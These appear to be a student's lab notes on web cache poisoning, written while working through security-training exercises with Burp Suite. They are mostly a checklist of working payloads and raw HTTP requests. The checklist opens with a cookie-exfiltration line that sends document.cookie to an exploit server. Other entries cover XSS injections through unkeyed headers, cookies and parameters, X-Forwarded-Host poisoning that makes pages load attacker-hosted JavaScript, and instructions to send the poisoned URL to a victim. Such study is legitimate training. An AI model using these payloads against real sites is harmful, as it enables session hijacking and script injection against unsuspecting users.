Burp Scan Is gotty : )

Checklist:
```
Poison to leak cookie:
document.location='https://<exploit-server>?cookie='+document.cookie;

0. Use cache buster with a random param or Origin header
1. Use Param Miner extension
2. X-Forwarded-Host unkeyed and used in an absolute URL = X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
3. A cookie is being reflected its content and hiting cache = fehost=someString"-alert(1)-"someString
4. Test multi cache header poison 
5. Check if user agents Vary on response, maybe need to retrieve it with xss
6. Unkeyed string? /?evil='/><script>alert(1)</script>
7. Unkeyed parameters with Param Miner? ?utm_content='/><script>alert(1)</script>
8. Parameter cloacking? param that gets reflected but keyed:
	1. Try duplicating param in head or body
	2. Try using an unkeyed param such as: setCountryCode=idkbro&utm_content=foo;setCountryCode=alert(1)
9. XSS vulnerability that is not directly exploitable due to browser URL-encoding. Take advantage of the cache's normalization process to exploit this vulnerability -> GET /random</p><script>alert(1)</script><p>foo
	1. Copy URL when cache hits, send to victim
```
##### With unkeyed header
```
Add a cache-buster query parameter, such as ?cb=1234.
Add the X-Forwarded-Host header with an arbitrary hostname, such as example.com, and send the request.
Observe that the X-Forwarded-Host header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at /resources/js/tracking.js.

Replay the request and observe that the response contains the header X-Cache: hit. This tells us that the response came from the cache.

Go to the exploit server and change the file name to match the path used by the vulnerable response:
/resources/js/tracking.js

In the body, enter the payload alert(document.cookie) and store the exploit.
Open the GET request for the home page in Burp Repeater and remove the cache buster.

Add the following header, remembering to enter your own exploit server ID:
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and X-Cache: hit in the headers.
```

##### Unkeyed cookie
A cookie is being reflected content on javascript and hiting cache.
```
fehost=someString"-alert(1)-"someString
```


##### Multi Header Poisoning cache header
```
GET /resources/js/tracking.js
...
X-Forwarded-Host: exploit-0a49001804f8a59482f069e8010b0050.exploit-server.net
X-Forwarded-Scheme: nothttps


Response:
HTTP/2 302 Found
Location: https://exploit-0a49001804f8a59482f069e8010b0050.exploit-server.net/resources/js/tracking.js
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 1
X-Cache: hit
Content-Length: 0


RIGHT CLICK COPY URL TO TEST PAYLOAD with ?cb=12345

SPAM SEND TILL POISONED withuth buster , RELOAD HOME PAGE TO TEST
```


##### X-Host but with user agent vary
Using the parameter miner extension we find the x-host header
```
X-Host: malware.com
Connection: close
...
...
Vary: User-Agent
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
...
   <body>
        <script type="text/javascript" src="//malware.com/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
```

XSS post coment to retrieve the user agent
```
<img src="exploit server">
```
```
...
X-Host: exploit-0ad9008c03e4756580a348aa019600fd.exploit-server.net
Connection: close
```
with a payload of alert(document.cookie) on the exploit server

##### Unkeyed query string
Use Origin: header as a cache buster
query /?evil=test gets reflected on the output
add payload
```
GET /?evil='/><script>alert(1)</script>
```
Remove query string to simulate victim, but still with cache buster, remove cache buster and add payload again till cache hits

#### unkeyed parameter
```
Observe that the home page is a suitable cache oracle. Notice that you get a cache miss whenever you change the query string. This indicates that it is part of the cache key. Also notice that the query string is reflected in the response.

using Param Miner extension we find that utm_content is supported

We confirm that the parameter is unkeyed by adding it to the query string and checking that we still get a cache hit

use a cache buster in the query such as &test=xyz along with the payload ?utm_content='/><script>alert(1)</script>

Remove payload copy URL and confirm that the alrt works, remove cache buster and add payload till hits to solve.

```

##### Parameter cloaking
```
Potential XSS on setCountryCode parameter, but we cannot cache it because its keyed. (adding 'aaa' will result in a miss cache)
Try polluting with duplicated parameter but doesnt work.

Find utm_content is not keyed
setCountryCode=idkbro&utm_content=foo;setCountryCode=alert(1)

This polutes cache, as we still get a hit when adding aaas to the final of the string
```

##### Web cache poisoning via a fat GET request
callback function can be modify and hit cache if duplicated parameter in the body
![[Pasted image 20240128175036.png]]
Reload Home page
